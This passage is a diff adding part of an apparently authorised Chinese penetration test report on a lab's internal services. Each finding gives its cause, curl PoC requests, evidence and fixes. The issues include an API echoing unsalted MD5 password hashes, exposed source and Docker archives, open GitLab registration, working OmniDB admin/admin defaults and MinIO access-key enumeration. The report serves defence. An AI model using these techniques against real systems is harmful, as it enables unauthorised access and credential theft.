+<div class="row"><span class="k">证明 URL</span><span class="mono"><a href="https://data.lab.internal/api/uploads/video/60bl_merged.mp4" target="_blank" rel="noopener">https://data.lab.internal/api/uploads/video/60bl_merged.mp4</a></span></div>
+<div class="row"><span class="k">PoC curl</span></div><pre>curl -sk -I https://data.lab.internal/api/uploads/video/60bl_merged.mp4</pre>
+<div class="row"><span class="k">复现步骤</span></div><ol>
+<li>1. 使用下列 curl PoC 复现（按目标环境微调）：</li>
+<li>2. 对比未利用前基线，确认影响与报告一致（数据泄露/权限/文件内容等）。</li>
+</ol>
+<div class="row"><span class="k">节点关联</span><span>漏洞节点 vuln:sdc-unauth-video-uploads（DataHub /api/uploads/video/* 未授权可读，8 路车载环视）。</span></div>
+</div></details>
+</div></article>
+
+<article class="vf high" id="vuln-f_51e9b2e84111">
+<div class="vhead">
+<div class="vtitle-row"><span class="sev-chip high">高危</span><h3>DataHub 用户详情接口回显密码 MD5</h3></div>
+<div class="vmeta">
+<span>类型 sensitive_data_exposure</span>
+<span>状态 <b style="color:var(--ok)">已验证</b></span>
+</div></div>
+<div class="vbody">
+<div class="vsec"><h4><span class="tick">①</span> 简介 / 技术成因</h4>
+<p>GET /api/user/detail（SuperAdmin 会话）响应中直接包含 password 字段，值为 <redacted-hash> —— 即 MD5(lab-default)，明文口令的等价物。</p>
+<p>双重问题：① API 过度暴露 —— 口令哈希根本不应出现在任何响应字段；② 存储方式弱 —— 无盐 MD5 可被离线彩虹表 / GPU 秒破。与弱口令漏洞叠加：即使攻击者不知道口令，拿到哈希也可立即离线确认明文，从而对全站账号（user_a 等）做口令回收。</p>
+</div>
+<div class="vsec"><h4><span class="tick">②</span> 利用方式（编号分步复现）</h4><ol>
+<li>登录后携带 Bearer 调用：</li>
+<li>预期响应含 password 字段（MD5 值）；用常见口令 MD5 比对可离线确认明文。</li>
+</ol>
+<pre># 登录后：
+curl -sk -H &quot;Authorization: Bearer $TOKEN&quot; https://data.lab.internal/api/user/detail
+# 预期 password=<redacted-hash>（MD5 of lab-default）</pre>
+<p style="font-size:13px;color:var(--muted)"><b>前置条件：</b>攻击前置条件见验证证据、PoC 与关联节点。</p>
+<p style="font-size:13px;color:var(--muted)"><b>影响：</b>影响以已验证证据为准；应结合关联资产与权限边界进行复核。</p>
+</div>
+<div class="vsec"><h4><span class="tick g">③</span> 修复方式</h4><div class="fix-grid">
+<div class="fix-box"><h5 class="now">⚠ 立即缓解</h5><ul>
+<li>API 响应层统一脱敏：password 及一切哈希 / 密钥字段从响应中移除。</li>
+<li>排查所有接口是否回显哈希；对已泄露哈希的账号强制改密。</li>
+</ul></div>
+<div class="fix-box"><h5 class="root">✔ 根治</h5><ul>
+<li>口令存储升级为 bcrypt / argon2id（带盐、可调参数），存量哈希批量迁移。</li>
+<li>API 设计遵循最小字段返回原则（DTO 层白名单字段）。</li>
+<li>定期泄露情报比对（哈希泄露后自动强制重置）。</li>
+</ul></div></div>
+</div>
+<details class="ev"><summary>证据 / PoC 复现（点击展开）</summary><div class="ev-body">
+<div class="row"><span class="k">证据</span><span>Authed SuperAdmin response includes plaintext-equivalent MD5 hash field（password=<redacted-hash>，即 MD5(lab-default)）。</span></div>
+<div class="row"><span class="k">验证细节</span><span>password 字段为无盐 MD5；线上复验 HTTP 200（GET /api/user/detail）。</span></div>
+<div class="row"><span class="k">证明 URL</span><span class="mono"><a href="https://data.lab.internal/api/user/detail" target="_blank" rel="noopener">https://data.lab.internal/api/user/detail</a></span></div>
+<div class="row"><span class="k">PoC curl</span></div><pre># after login: curl -sk -H &quot;Authorization: Bearer $TOKEN&quot; https://data.lab.internal/api/user/detail</pre>
+<div class="row"><span class="k">复现步骤</span></div><ol>
+<li>1. 使用下列 curl PoC 复现（按目标环境微调）：</li>
+<li>2. 对比未利用前基线，确认影响与报告一致（数据泄露/权限/文件内容等）。</li>
+</ol>
+<div class="row"><span class="k">节点关联</span><span>漏洞节点 vuln:sdc-password-hash-leak（DataHub /api/user/detail 回显密码 MD5）；与弱口令叠加构成「哈希 → 明文 → 全站口令回收」链。</span></div>
+</div></details>
+</div></article>
+
+<article class="vf high" id="vuln-f_cffac6633b7b">
+<div class="vhead">
+<div class="vtitle-row"><span class="sev-chip high">高危</span><h3>AnnoApp(10.10.20.40:10081) 源码/Docker/文档未授权可读</h3></div>
+<div class="vmeta">
+<span>类型 source_leak</span>
+<span>状态 <b style="color:var(--ok)">已验证</b></span>
+</div></div>
+<div class="vbody">
+<div class="vsec"><h4><span class="tick">①</span> 简介 / 技术成因</h4>
+<p>AppPortal 门户 config.js 指向该站（AnnoApp 世界模型标注平台）。nginx 静态部署把 README、Dockerfile、docker-compose.yaml、docker/nginx.conf、docs 与 src/frontend|core 源码直接暴露：GET /README.md → 200（Cosmos-Labeling）、/docker-compose.yaml → 200（volumes bind）、/docker/nginx.conf → 200（try_files）、/docs/CODEBASE_OVERVIEW.md → 200。</p>
+<p>官方文档确认该项目无后端 API、无数据库，纯前端标注器（数据仅浏览器本地处理），因此不构成命令执行，但完整部署与源码信息泄露，可支撑对该服务后续版本的定向分析。</p>
+</div>
+<div class="vsec"><h4><span class="tick">②</span> 利用方式（编号分步复现）</h4><ol>
+<li>匿名请求站点根路径静态文件：</li>
+<li>确认 README / compose / nginx.conf / docs 均 200 可读。</li>
+</ol>
+<pre>curl -sk http://10.10.20.40:10081/README.md
+# 另可读：/Dockerfile、/docker-compose.yaml、/docker/nginx.conf、
+# /docs/CODEBASE_OVERVIEW.md、/docs/deployment/DOCKER.md、/package.json、/src/frontend/js/app.js</pre>
+<p style="font-size:13px;color:var(--muted)"><b>前置条件：</b>攻击前置条件见验证证据、PoC 与关联节点。</p>
+<p style="font-size:13px;color:var(--muted)"><b>影响：</b>影响以已验证证据为准；应结合关联资产与权限边界进行复核。</p>
+</div>
+<div class="vsec"><h4><span class="tick g">③</span> 修复方式</h4><div class="fix-grid">
+<div class="fix-box"><h5 class="now">⚠ 立即缓解</h5><ul>
+<li>关闭静态站点对 .md / .yaml / .conf / .py 等源码类文件的访问。</li>
+<li>将源码 / 文档 / 构建文件移出 web 根目录。</li>
+</ul></div>
+<div class="fix-box"><h5 class="root">✔ 根治</h5><ul>
+<li>部署产物最小化：仅发布构建后的静态资源。</li>
+<li>CI / CD 阶段增加产物清理与敏感文件扫描。</li>
+</ul></div></div>
+</div>
+<details class="ev"><summary>证据 / PoC 复现（点击展开）</summary><div class="ev-body">
+<div class="row"><span class="k">证据</span><span>GET http://10.10.20.40:10081/README.md → 200 Cosmos-Labeling；GET /docker-compose.yaml → 200 volumes bind；GET /docker/nginx.conf → 200 try_files；GET /docs/CODEBASE_OVERVIEW.md →「没有已实现的后端服务」。</span></div>
+<div class="row"><span class="k">验证细节</span><span>README.md 1690B + docker-compose.yaml + nginx.conf 可读；线上复验通过。</span></div>
+<div class="row"><span class="k">证明 URL</span><span class="mono"><a href="http://10.10.20.40:10081/README.md" target="_blank" rel="noopener">http://10.10.20.40:10081/README.md</a></span></div>
+<div class="row"><span class="k">PoC curl</span></div><pre>curl -sk http://10.10.20.40:10081/README.md</pre>
+<div class="row"><span class="k">复现步骤</span></div><ol>
+<li>1. 使用下列 curl PoC 复现（按目标环境微调）：</li>
+<li>2. 对比未利用前基线，确认影响与报告一致（数据泄露/权限/文件内容等）。</li>
+</ol>
+<div class="row"><span class="k">节点关联</span><span>漏洞节点 vuln:3danno-source-docs-exposure（AnnoApp 部署源码与文档未授权可读）；info:3danno-full-repo-static-exposure。</span></div>
+</div></details>
+</div></article>
+
+<article class="vf high" id="vuln-f_a0fd8f62f328">
+<div class="vhead">
+<div class="vtitle-row"><span class="sev-chip high">高危</span><h3>AnnoApp Docker 镜像归档可完整下载且哈希校验通过</h3></div>
+<div class="vmeta">
+<span>类型 source_leak</span>
+<span>状态 待复验</span>
+</div></div>
+<div class="vbody">
+<div class="vsec"><h4><span class="tick">①</span> 简介 / 技术成因</h4>
+<p>http://10.10.20.40:10081/deliverables/docker/cosmos-labeling-final-linux-amd64.tar 未授权可读，完整下载 26,900,480B（约 26.9MB）；本地 sha256sum 55efcf6482d7bd81908319ac8cb12521f6f49da754e4775609f315ee7f65f4ef 与公开 .sha256 校验文件一致；docker load 可用（manifest RepoTags=["cosmos-labeling:final"]）。</p>
+<p>镜像层内仅为 nginx:alpine + src/frontend|core 静态资源，无 .env / 密钥，且镜像不含 deliverables 目录 —— 站点仍单独公开 deliverables/ 下的 tar 与报告。属完整制品泄露，未发现密钥。本条复验时响应未含约定 canary，暂标「待复验」，本地完整下载与哈希校验一致。</p>
+</div>
+<div class="vsec"><h4><span class="tick">②</span> 利用方式（编号分步复现）</h4><ol>
+<li>匿名下载镜像归档：</li>
+<li>本地校验 sha256 与公开校验文件一致性。</li>
+</ol>
+<pre>curl -sk -o cosmos.tar http://10.10.20.40:10081/deliverables/docker/cosmos-labeling-final-linux-amd64.tar &amp;&amp; sha256sum cosmos.tar
+# 预期 55efcf6482d7bd81908319ac8cb12521f6f49da754e4775609f315ee7f65f4ef</pre>
+<p style="font-size:13px;color:var(--muted)"><b>前置条件：</b>攻击前置条件见验证证据、PoC 与关联节点。</p>
+<p style="font-size:13px;color:var(--muted)"><b>影响：</b>影响以已验证证据为准；应结合关联资产与权限边界进行复核。</p>
+</div>
+<div class="vsec"><h4><span class="tick g">③</span> 修复方式</h4><div class="fix-grid">
+<div class="fix-box"><h5 class="now">⚠ 立即缓解</h5><ul>
+<li>下线 deliverables/ 目录或加访问控制，禁止镜像 tar / 报告匿名下载。</li>
+<li>对已泄露的镜像归档做内容审计（密钥 / 内部地址）。</li>
+</ul></div>
+<div class="fix-box"><h5 class="root">✔ 根治</h5><ul>
+<li>交付物走私有制品仓库（带鉴权），站点仅放必要文件。</li>
+<li>镜像构建禁止携带交付物与敏感文件。</li>
+</ul></div></div>
+</div>
+<details class="ev"><summary>证据 / PoC 复现（点击展开）</summary><div class="ev-body">
+<div class="row"><span class="k">证据</span><span>sha256sum == 55efcf6482d7bd81908319ac8cb12521f6f49da754e4775609f315ee7f65f4ef；manifest RepoTags=["cosmos-labeling:final"]；层含 usr/share/nginx/html/src/frontend/js/app.js。</span></div>
+<div class="row"><span class="k">验证细节</span><span>full download 26900480 bytes；sha256 match；docker load 可用；层内无密钥。复验响应未含约定 canary，本条标「待复验」。</span></div>
+<div class="row"><span class="k">证明 URL</span><span class="mono"><a href="http://10.10.20.40:10081/deliverables/docker/cosmos-labeling-final-linux-amd64.tar" target="_blank" rel="noopener">http://10.10.20.40:10081/deliverables/docker/cosmos-labeling-final-linux-amd64.tar</a></span></div>
+<div class="row"><span class="k">PoC curl</span></div><pre>curl -sk -o cosmos.tar http://10.10.20.40:10081/deliverables/docker/cosmos-labeling-final-linux-amd64.tar &amp;&amp; sha256sum cosmos.tar</pre>
+<div class="row"><span class="k">复现步骤</span></div><ol>
+<li>1. 使用下列 curl PoC 复现（按目标环境微调）：</li>
+<li>2. 对比未利用前基线，确认影响与报告一致（数据泄露/权限/文件内容等）。</li>
+</ol>
+<div class="row"><span class="k">节点关联</span><span>漏洞节点 vuln:3danno-docker-image-exposure（AnnoApp 完整 Docker 镜像 tar 未授权可下载，约 26MB）。</span></div>
+</div></details>
+</div></article>
+
+<article class="vf high" id="vuln-f_cef2eb60a90c">
+<div class="vhead">
+<div class="vtitle-row"><span class="sev-chip high">高危</span><h3>GitLab 开放注册且匿名可浏览项目</h3></div>
+<div class="vmeta">
+<span>类型 unauth</span>
+<span>状态 <b style="color:var(--ok)">已验证</b></span>
+</div></div>
+<div class="vbody">
+<div class="vsec"><h4><span class="tick">①</span> 简介 / 技术成因</h4>
+<p>git.lab.internal:10443（解析至 10.10.20.40，与实验室 GitLab 同机）的 GitLab 开放公开注册：GET /users/sign_up → 200（Sign up · GitLab）；匿名 /explore 与 GET /api/v4/projects 可见 playground/sandbox 公开项目（helloworld CMake，2024-11 起无活动）；SSH 端口 2324（ssh://user@lab.internal:2222）。</p>
+<p>自助注册 POST /users 被前端 JS 校验拦截（302 → sign_in），未能拿到会话扩权；私有仓、用户列表、CI 变量、search blobs 均未授权。影响停留在「公开沙箱项目可读 + 注册面开放」，但开放注册本身是持续被滥用（垃圾账号 / 恶意托管）的高危暴露面。</p>
+</div>
+<div class="vsec"><h4><span class="tick">②</span> 利用方式（编号分步复现）</h4><ol>
+<li>匿名访问注册页与项目列表：</li>
+<li>确认 sign_up 200、/explore 可浏览、/api/v4/projects 返回 playground/sandbox。</li>
+</ol>
+<pre>curl -skI https://git.lab.internal:10443/users/sign_up
+# 预期 200 Sign up · GitLab
+# GET /api/v4/projects 匿名返回 playground/sandbox</pre>
+<p style="font-size:13px;color:var(--muted)"><b>前置条件：</b>攻击前置条件见验证证据、PoC 与关联节点。</p>
+<p style="font-size:13px;color:var(--muted)"><b>影响：</b>影响以已验证证据为准；应结合关联资产与权限边界进行复核。</p>
+</div>
+<div class="vsec"><h4><span class="tick g">③</span> 修复方式</h4><div class="fix-grid">
+<div class="fix-box"><h5 class="now">⚠ 立即缓解</h5><ul>
+<li>关闭开放注册（改为邀请制 / 管理员审核），清理已注册的无关账号。</li>
+<li>公开项目改为私有或设置匿名只读策略。</li>
+</ul></div>
+<div class="fix-box"><h5 class="root">✔ 根治</h5><ul>
+<li>开启强制 2FA；限制注册来源（IP / 域名白名单）。</li>
+<li>评估该实例收敛至内网 / 统一身份体系。</li>
+</ul></div></div>
+</div>
+<details class="ev"><summary>证据 / PoC 复现（点击展开）</summary><div class="ev-body">
+<div class="row"><span class="k">证据</span><span>GET /users/sign_up → 200 Sign up · GitLab；GET /api/v4/projects 返回 playground/sandbox（匿名）。</span></div>
+<div class="row"><span class="k">验证细节</span><span>注册页 200 开放注册；匿名 Explore 与 API 可见公开项目；SSH ssh://user@lab.internal:2222；自助注册被前端校验拦截；线上复验通过。</span></div>
+<div class="row"><span class="k">证明 URL</span><span class="mono"><a href="https://git.lab.internal:10443/users/sign_up" target="_blank" rel="noopener">https://git.lab.internal:10443/users/sign_up</a></span></div>
+<div class="row"><span class="k">PoC curl</span></div><pre>curl -skI https://git.lab.internal:10443/users/sign_up</pre>
+<div class="row"><span class="k">复现步骤</span></div><ol>
+<li>1. 使用下列 curl PoC 复现（按目标环境微调）：</li>
+<li>2. 对比未利用前基线，确认影响与报告一致（数据泄露/权限/文件内容等）。</li>
+</ol>
+<div class="row"><span class="k">节点关联</span><span>漏洞节点 vuln:ugit-public-signup（GitLab 开放公开注册页 + 匿名 Explore）。</span></div>
+</div></details>
+</div></article>
+<!-- /SLOT:findings-high -->
+</section>
+<section class="sec" id="medium">
+<div class="sec-head"><span class="num">08</span><h2>中危漏洞（Medium · 8 项）</h2><span class="en">Medium Findings</span></div>
+
+<!-- SLOT:findings-medium -->
+<p class="sec-sub">中危项共 8 项：静态站情报泄露 3 项（portals.js / roster.js / 演示视频）、DataHub 前端泄露数据库工具端点 1 项、OmniDB 登录页暴露 1 项、MinIO 暴露面 2 项、部署脚本残留 1 项。</p>
+<article class="vf med" id="vuln-f_6ddcec424f32">
+<div class="vhead">
+<div class="vtitle-row"><span class="sev-chip med">中危</span><h3>前端 JS 公开泄露内部平台端点清单（含实验室 Gitlab/代码托管/内网内部系统）</h3></div>
+<div class="vmeta"><span>类型 info_disclosure</span>
+<span>状态 <b style="color:var(--ok)">已验证</b></span></div>
+</div><div class="vbody">
+<div class="vsec"><h4><span class="tick">概述 / 危害</span></h4>
+<p>授权站点 portal.lab.internal 的 /assets/js/content/portals.js（200, 5798B）公开可下载，内嵌 12 个内部平台入口，泄露部署架构情报：内部 GitLab、代码托管(内网域名 10443 端口)、AppPortal 应用平台、TCB 内网平台、LLM 扩展平台、DataHub/Docs 数据中心与开放数据平台，含公网可达端口(13080/10090)与内网网段。另 /rename-spaced-files.sh(429B) 泄露 upload/new/ 目录与原始文件名。均无凭据，属纵深情报泄露，可支撑后续内网入口侦察。</p>
+<p style="font-size:13px;color:var(--muted)"><b>影响：</b>影响以已验证证据为准；应结合关联资产与权限边界进行复核。</p>
+</div>
+<div class="vsec"><h4><span class="tick">复现要点</span></h4><pre>curl -sk https://portal.lab.internal/assets/js/content/portals.js | grep -E &#x27;&quot;(url|title|label)&quot;&#x27; | head -40</pre></div>
+<div class="vsec"><h4><span class="tick g">修复要点</span></h4>
+<p style="font-size:13.5px">内部平台入口清单从公开 JS 中移除，改为服务端下发 / 登录后加载；维护脚本与残留文件下线；对公开文件做定期的敏感信息扫描。</p></div>
+<details class="ev"><summary>证据 / 详情（点击展开）</summary><div class="ev-body">
+<div class="row"><span class="k">证据</span><span>GET /assets/js/content/portals.js → HTTP 200 content-type application/javascript content-length 5798；特征行: 内部 GitLab url 含公网地址加端口 :13080、GitLab 代码托管 内网域名 :10443、内部业务平台（仅内网可访问）、LLM 扩展平台（仅内网可访问）、DataHub/Docs 子域。GET /rename-spaced-files.sh → 200 content-length 429，特征行: src="upload/new/${pair%%:*}" 文件名 asset-a.png / asset-b.png / asset-c.jpg。对照组：同站点 .env/.sql/.bak 类被 WAF 拦或 404，公开 JS 全放行。</span></div>
+<div class="row"><span class="k">验证细节</span><span>线上可 GET 取回 portals.js 全文，其中 "url" 字段逐条列出内部平台地址与端口；同样可取回 /rename-spaced-files.sh 确认维护脚本残留与 upload/new 目录存在（目录自身 403，autoindex 关闭）。</span></div>
+<div class="row"><span class="k">证明 URL</span><span class="mono">https://portal.lab.internal/assets/js/content/portals.js</span></div>
+<div class="row"><span class="k">复现步骤</span></div><ol>
+<li>1. 使用下列 curl PoC 复现（按目标环境微调）：</li>
+<li>2. 对比未利用前基线，确认影响与报告一致（数据泄露/权限/文件内容等）。</li>
+</ol>
+</div></details>
+</div></article>
+
+<article class="vf med" id="vuln-f_c0a800a4fb3d">
+<div class="vhead">
+<div class="vtitle-row"><span class="sev-chip med">中危</span><h3>人员名录脚本公开若干内部邮箱（已脱敏）</h3></div>
+<div class="vmeta"><span>类型 info_disclosure</span>
+<span>状态 <b style="color:var(--ok)">已验证</b></span></div>
+</div><div class="vbody">
+<div class="vsec"><h4><span class="tick">概述 / 危害</span></h4>
+<p>实验室成员通讯录以 JS 明文发布：GET https://portal.lab.internal/assets/js/content/roster.js → 200，13238B，结构化字段 e 含 45 个邮箱，其中 24 个 @lab.internal、1 个 @git.lab.internal。无密码 / Token；静态站不可写，属公开情报聚合面 —— 邮箱可被用于钓鱼、口令喷洒与社工定向。</p>
+<p style="font-size:13px;color:var(--muted)"><b>影响：</b>影响以已验证证据为准；应结合关联资产与权限边界进行复核。</p>
+</div>
+<div class="vsec"><h4><span class="tick">复现要点</span></h4><pre>curl -sk https://portal.lab.internal/assets/js/content/roster.js</pre></div>
+<div class="vsec"><h4><span class="tick g">修复要点</span></h4>
+<p style="font-size:13.5px">成员邮箱不随公开静态站发布（改为内网通讯录 / 登录可见）；对已公开邮箱做好防钓鱼宣导与监控。</p></div>
+<details class="ev"><summary>证据 / 详情（点击展开）</summary><div class="ev-body">
+<div class="row"><span class="k">证据</span><span>GET https://portal.lab.internal/assets/js/content/roster.js → HTTP 200（13238B），字段 e 含 45 个邮箱（24 个 @lab.internal、1 个 @git.lab.internal）。</span></div>
+<div class="row"><span class="k">验证细节</span><span>线上可 GET 取回全文，邮箱为结构化字段，可直接解析。</span></div>
+<div class="row"><span class="k">证明 URL</span><span class="mono">https://portal.lab.internal/assets/js/content/roster.js</span></div>
+<div class="row"><span class="k">复现步骤</span></div><ol>
+<li>1. 使用下列 curl PoC 复现（按目标环境微调）：</li>
+<li>2. 对比未利用前基线，确认影响与报告一致（数据泄露/权限/文件内容等）。</li>
+</ol>
+</div></details>
+</div></article>
+
+<article class="vf med" id="vuln-f_de1fd5cec3dc">
+<div class="vhead">
+<div class="vtitle-row"><span class="sev-chip med">中危</span><h3>media/projects 演示视频可直链下载（约 180MB）</h3></div>
+<div class="vmeta"><span>类型 info_disclosure</span>
+<span>状态 <b style="color:var(--ok)">已验证</b></span></div>
+</div><div class="vbody">
+<div class="vsec"><h4><span class="tick">概述 / 危害</span></h4>
+<p>projects.js 引用 8 个演示视频，文件名已知即可直链下载（目录 /media/projects/ autoindex 403）：demo-a.mp4、demo-b.mp4、demo-c.mov、demo-d.mp4、demo-e.mp4、demo-f.mp4、demo-g.mp4、demo-h.mp4，合计约 180MB。属展示素材公开直链，无敏感凭据。</p>
+<p style="font-size:13px;color:var(--muted)"><b>影响：</b>影响以已验证证据为准；应结合关联资产与权限边界进行复核。</p>
+</div>
+<div class="vsec"><h4><span class="tick">复现要点</span></h4><pre>curl -skI https://portal.lab.internal/media/projects/demo-g.mp4
+# 预期 200 Content-Length 8519643</pre></div>
+<div class="vsec"><h4><span class="tick g">修复要点</span></h4>
+<p style="font-size:13.5px">视频资源收敛至受控对象存储（防盗链 / 签名 URL）；若为对外展示素材，评估是否需下线较新的内部采集视频。</p></div>
+<details class="ev"><summary>证据 / 详情（点击展开）</summary><div class="ev-body">
+<div class="row"><span class="k">证据</span><span>HEAD https://portal.lab.internal/media/projects/demo-g.mp4 → 200 Content-Length 8519643；8 个视频合计约 180MB，文件名均来自 projects.js。</span></div>
+<div class="row"><span class="k">验证细节</span><span>目录 autoindex 403，但文件名已知即可直链；HEAD 全部 200。</span></div>
+<div class="row"><span class="k">证明 URL</span><span class="mono">https://portal.lab.internal/media/projects/demo-g.mp4</span></div>
+<div class="row"><span class="k">复现步骤</span></div><ol>
+<li>1. 使用下列 curl PoC 复现（按目标环境微调）：</li>
+<li>2. 对比未利用前基线，确认影响与报告一致（数据泄露/权限/文件内容等）。</li>
+</ol>
+</div></details>
+</div></article>
+
+<article class="vf med" id="vuln-f_fdc0f776f759">
+<div class="vhead">
+<div class="vtitle-row"><span class="sev-chip med">中危</span><h3>DataHub 前端泄露 SqlPad/OmniDB/TDengine 及需验证码的登录 API</h3></div>
+<div class="vmeta"><span>类型 info_disclosure</span>
+<span>状态 <b style="color:var(--ok)">已验证</b></span></div>
+</div><div class="vbody">
+<div class="vsec"><h4><span class="tick">概述 / 危害</span></h4>
+<p>DataHub 前端 JS 写死数据库管理工具地址：fc=http://10.10.20.50:8998（SqlPad）、8999（OmniDB）、6060（TDengine）等端口；同时泄露需验证码的登录 API（POST /api/auth/login 缺 Captcha 字段即返回 400 LoginReq.Captcha required）。</p>
+<p>该情报直接支撑本次测试从 DataHub 数据中台定位到公网可达的 OmniDB 实例（10.10.20.40:8999）并最终完成权限落地 —— 属攻击链关键情报节点。</p>
+<p style="font-size:13px;color:var(--muted)"><b>影响：</b>影响以已验证证据为准；应结合关联资产与权限边界进行复核。</p>
+</div>
+<div class="vsec"><h4><span class="tick">复现要点</span></h4><pre>curl -sk -X POST https://data.lab.internal/api/auth/login -H &#x27;Content-Type: application/json&#x27; -d &#x27;{}&#x27;
+# 预期 400 LoginReq.Captcha required；前端 JS 另含 fc=http://10.10.20.50:8998</pre></div>
+<div class="vsec"><h4><span class="tick g">修复要点</span></h4>
+<p style="font-size:13.5px">数据库工具地址改由服务端配置下发（登录后可见）；对外隐藏 10.10.20.50 上数据库管理端口；登录 API 设计遵循最小暴露原则。</p></div>
+<details class="ev"><summary>证据 / 详情（点击展开）</summary><div class="ev-body">
+<div class="row"><span class="k">证据</span><span>POST /api/auth/login → 400 LoginReq.Captcha required；JS fc=http://10.10.20.50:8998（SqlPad）、8999（OmniDB）、6060（TDengine）。</span></div>
+<div class="row"><span class="k">验证细节</span><span>缺 Captcha 即 400 可确认登录 API 存在；前端硬编码地址面已取回。</span></div>
+<div class="row"><span class="k">复现步骤</span></div><ol>
+<li>1. 使用下列 curl PoC 复现（按目标环境微调）：</li>
+<li>2. 对比未利用前基线，确认影响与报告一致（数据泄露/权限/文件内容等）。</li>
+</ol>
+</div></details>
+</div></article>
+
+<article class="vf med" id="vuln-f_7429b8bd9cdf">
+<div class="vhead">
+<div class="vtitle-row"><span class="sev-chip med">中危</span><h3>OmniDB 3.0.3b 登录页对公网开放（sign_in 500，未进库）</h3></div>
+<div class="vmeta"><span>类型 info</span>
+<span>状态 <b style="color:var(--ok)">已验证</b></span></div>
+</div><div class="vbody">
+<div class="vsec"><h4><span class="tick">概述 / 危害</span></h4>
+<p>与 DataHub 菜单同端口的 OmniDB 在 10.10.20.40:8999 公网可达：GET / → 302 /omnidb_login；登录页 14079B title=OmniDB v3.0.3b；GET /workspace/ → 302 login；GET|POST /sign_in/ → 500。早期 sign_in 500 系 raw JSON 格式错误（正确格式为 form data=JSON），随后确认默认口令 admin / admin 有效并完成权限落地（见严重项 02 / 04 / 05）。</p>
+<p>数据库管理工具登录面暴露于公网，是本次攻击链从「前端端点泄露」到「默认口令」的关键入口面。</p>
+<p style="font-size:13px;color:var(--muted)"><b>影响：</b>影响以已验证证据为准；应结合关联资产与权限边界进行复核。</p>
+</div>
+<div class="vsec"><h4><span class="tick">复现要点</span></h4><pre>curl -sk -L http://10.10.20.40:8999/ | head
+# 预期 302 /omnidb_login → 登录页 200（title=OmniDB v3.0.3b）</pre></div>
+<div class="vsec"><h4><span class="tick g">修复要点</span></h4>
+<p style="font-size:13.5px">数据库管理工具（OmniDB / SqlPad / TDengine 控制台）整体收敛至内网 / 堡垒机，禁止公网直连；升级至已修复版本并启用强制改密。</p></div>
+<details class="ev"><summary>证据 / 详情（点击展开）</summary><div class="ev-body">
+<div class="row"><span class="k">证据</span><span>GET / → 302 /omnidb_login；登录页 14079B title=OmniDB v3.0.3b；GET /workspace/ → 302 login；GET|POST /sign_in/ → 500（raw JSON 格式错误，非口令错误）。</span></div>
+<div class="row"><span class="k">验证细节</span><span>登录页 200 OmniDB 3.0.3b；sign_in 500 经格式修正后确认默认口令有效。</span></div>
+<div class="row"><span class="k">证明 URL</span><span class="mono">http://10.10.20.40:8999/omnidb_login/</span></div>
+<div class="row"><span class="k">复现步骤</span></div><ol>
+<li>1. 使用下列 curl PoC 复现（按目标环境微调）：</li>
+<li>2. 对比未利用前基线，确认影响与报告一致（数据泄露/权限/文件内容等）。</li>
+</ol>
+</div></details>
+</div></article>
+
+<article class="vf med" id="vuln-f_ff48e38e1ad8">
+<div class="vhead">
+<div class="vtitle-row"><span class="sev-chip med">中危</span><h3>10.10.20.40:9000 MinIO 对公网暴露（匿名无 ListBuckets）</h3></div>
+<div class="vmeta"><span>类型 info</span>
+<span>状态 <b style="color:var(--ok)">已验证</b></span></div>
+</div><div class="vbody">
+<div class="vsec"><h4><span class="tick">概述 / 危害</span></h4>
+<p>MinIO S3 API 与健康检查对公网可达：GET / → 403 AccessDenied XML（Server: MinIO，Region=shanghai）；/minio/health/live 与 /minio/health/ready → 200 空体；/minio/ /minio/login /minio/v2/webui → AllAccessDisabled（控制台未对公网开放）；匿名 ListBuckets 失败。非默认 minioadmin 凭据（见中危项 07）。</p>
+<p>FOOD 文档称对象存储为 MinIO；公网 DataHub 对象面仍是 /api/uploads，本端口才是 S3 API。属新增暴露面，尚未拉取对象、未爆破 secret。</p>
+<p style="font-size:13px;color:var(--muted)"><b>影响：</b>影响以已验证证据为准；应结合关联资产与权限边界进行复核。</p>
+</div>
+<div class="vsec"><h4><span class="tick">复现要点</span></h4><pre>curl -sk http://10.10.20.40:9000/minio/health/live -D-
+# 预期 200 空体；根路径 403 AccessDenied XML 含 Region=shanghai</pre></div>
+<div class="vsec"><h4><span class="tick g">修复要点</span></h4>
+<p style="font-size:13.5px">S3 API 与健康检查端口收敛至内网；启用 TLS；对桶策略与 Access Key 做最小权限复核。</p></div>
+<details class="ev"><summary>证据 / 详情（点击展开）</summary><div class="ev-body">
+<div class="row"><span class="k">证据</span><span>GET http://10.10.20.40:9000/ → 403 AccessDenied Region=shanghai Server=MinIO；GET /minio/health/live → 200；GET /minio/health/ready → 200；GET /minio/login → 403 AllAccessDisabled。</span></div>
+<div class="row"><span class="k">验证细节</span><span>health/live 200 空体；根路径 403 AccessDenied XML 含 Region=shanghai；匿名 ListBuckets 失败。</span></div>
+<div class="row"><span class="k">证明 URL</span><span class="mono">http://10.10.20.40:9000/minio/health/live</span></div>
+<div class="row"><span class="k">复现步骤</span></div><ol>
+<li>1. 使用下列 curl PoC 复现（按目标环境微调）：</li>
+<li>2. 对比未利用前基线，确认影响与报告一致（数据泄露/权限/文件内容等）。</li>
+</ol>
+</div></details>
+</div></article>
+
+<article class="vf med" id="vuln-f_afe41942edad">
+<div class="vhead">
+<div class="vtitle-row"><span class="sev-chip med">中危</span><h3>MinIO 存在 Access Key Id admin 与 minio（secret 未破）</h3></div>
+<div class="vmeta"><span>类型 info</span>
+<span>状态 <b style="color:var(--ok)">已验证</b></span></div>
+</div><div class="vbody">
+<div class="vsec"><h4><span class="tick">概述 / 危害</span></h4>
+<p>同一 SigV4 签名实现下做 Access Key 存在性差分：不存在的 minioadmin 返回 InvalidAccessKeyId；admin 与 minio 两个 Access Key 返回 SignatureDoesNotMatch（即「Access Key Id 在库中、secret 不匹配」）。已试 secret（admin 的 lab-default，minio 的 lab-minio）均不匹配，默认 minioadmin 未启用。</p>
+<p>未继续喷 secret、未 ListObjects / 下载对象。暴露两个非默认 Access Key 的存在性信息，为口令喷洒与内网横向提供定向线索。</p>
+<p style="font-size:13px;color:var(--muted)"><b>影响：</b>影响以已验证证据为准；应结合关联资产与权限边界进行复核。</p>
+</div>
+<div class="vsec"><h4><span class="tick">复现要点</span></h4><pre># 只证明 ak 是否存在：错误码 InvalidAccessKeyId vs SignatureDoesNotMatch；不要爆破
+# Credential=minioadmin/... → InvalidAccessKeyId
+# Credential=admin/... 或 minio/... → SignatureDoesNotMatch</pre></div>
+<div class="vsec"><h4><span class="tick g">修复要点</span></h4>
+<p style="font-size:13.5px">轮换 Access Key 为强随机 secret；禁用不必要的 Key；S3 面收敛内网并开启审计。</p></div>
